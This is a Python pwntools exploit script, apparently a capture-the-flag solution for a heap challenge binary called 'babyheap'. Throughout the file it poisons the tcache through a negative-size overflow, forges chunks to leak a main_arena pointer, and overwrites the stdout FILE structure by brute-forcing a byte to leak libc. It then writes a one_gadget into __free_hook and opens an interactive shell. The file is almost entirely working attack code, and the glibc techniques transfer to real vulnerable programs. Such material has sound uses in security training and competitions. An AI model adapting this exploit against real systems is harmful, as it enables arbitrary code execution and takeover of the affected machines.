#!/usr/bin/python3

from pwn import *

bname = './babyheap'
context.binary = bname
r = process(bname, env={'LD_PRELOAD': './libc.so'})
libc = ELF('./libc.so')
chunksize = 0x21000

def res(size, name, ans):
    r.sendafter('option :', 'N')
    r.sendafter('input size:', size)
    r.sendafter('name :', name)
    r.sendafter('free?(y/n)', ans)

res(str(0xA0), 'A'*0xA0, 'n') # chunk offset

# 1. get double free
#--------------------------------------------------------------
fakechunks = flat (
    b'A'*0x10,
    p64 (0), p64(0x41) + b'\x70'
)
res(str(0x30), 'A'*0x30, 'y') # chunk1
res(str(0x10), 'A'*0x10, 'y') # fake chunk
res(str(0x40), 'A'*0x40, 'y') # size 0x40
res(str(-1), fakechunks, 'y') # size 0x40 --> 0x30
res(str(0x40), 'A', 'y') # chunk2 free 0x40 --> insert into 0x30 tcache (now tcache: t_header --> chunk2 --> chunk1)
res(str(-1), fakechunks, 'n') # modify last byte --> point to unsorted chunk

# 2. get unsorted chunk
#--------------------------------------------------------------
"""
tcache size: ~ 0x400, so freed 0x410 chunk will go to unsorted bin, and unsorted bin has main_arena address
"""
res(str(0x10), 'A'*0x10, 'y') # malloc(-1) can control the chunk and put any size data
res(str(0x20), 'B'*0x20, 'y') # our target, which malloc with size 0x30, but will be freed with size 0x410
target_chunksize = 0x410 #
fakechunks = flat(
    b'A'* 0x10,
    p64 (0),                       p64 ( target_chunksize + 0x11 ), b'A'*target_chunksize, # chunk1 (our fake unsorted chunk)
    p64 (0),                       p64 (0x21),                      b'A'*0x10, # chunk2 (prevent merge)
    p64 (0),                       p64 (0x21),                      b'A'*0x10, # chunk3 (if not put it, it will cause corrupted size vs prev_size error, I don't know why...)
)
res(str(-1), fakechunks, 'y')
res(str(0x20), 'A', 'y') # get main_arena addr
res(str(0x60), 'A', 'n') # split unsorted chunk

# 3. hijack STDOUT
#--------------------------------------------------------------
guess_byte = 0 # 0~15
stdout_addr_last_4_bytes = b'\x20' + bytes([guess_byte*16 + 7])
res(str(-1), b'A'*0x20 + stdout_addr_last_4_bytes, 'n') # get fake chunk, overwrite last 4 bytes
res(str(0x30), b'\xe0', 'n') # last byte offset ==> point to unsorted chunk, free chunk1
res(str(0x30), b'\xe0', 'n') # last byte offset ==> point to unsorted chunk, free chunk2
res(str(0x30), b'\xe0', 'n') # get fake chunk, which next is target

fake_stdout = flat(
    p64(0xfbad1800), # _flags
    p64(0), # _IO_read_ptr
    p64(0), # _IO_read_end
    p64(0), # _IO_read_base
) + b'\x00' # _IO_write_base
"""
stdout_addr = libc4 + 0x1720
bin_addr = libc4 + 0xc78
** stdout_addr, bin_addr in ASLR **
0x7f48b6fed760, 0x7f48b6fecc78
0x7f9668e32760, 0x7f9668e31c78

We can find the 4nd byte from right is random, and last bytes are fixed.
we can guess 1/16 to get correct byte.
"""
res(str(0x30), fake_stdout, 'n') # get stdout and modify stdout
# _IO_file_jumps = libc + 0x3d73e0
libc_addr = u64((r.recvuntil('\x7f')[-6:]).ljust(8, b'\x00')) - 0x3d73e0
log.info("libc_addr: " + hex(libc_addr))

# 4. put one_gadget into free_hook
#--------------------------------------------------------------
one_gadget = libc_addr + 0xfcc6e
free_hook = libc_addr + libc.symbols['__free_hook']

fakechunks = flat (
    b'A'*0x10,
    p64 (0), p64(0x81) + p64(free_hook)
)
res(str(0x70), b'A'*0x70, 'y') # chunk1, off: 0x440
res(str(0x10), b'A'*0x10, 'y') # fake chunk, off: 0x4c0
res(str(0x80), b'A'*0x80, 'y') # chunk2, off: 0x4e0
res(str(-1), fakechunks, 'y') # hijack chunk2: size 0x80 -> 0x70
res(str(0x80), b'A', 'y') # insert chunk2 into tcache
res(str(-1), fakechunks, 'n') # change chunk2 fd into tcache

res(str(0x70), p64(free_hook), 'n')
res(str(0x70), p64(one_gadget), 'y')

r.interactive()
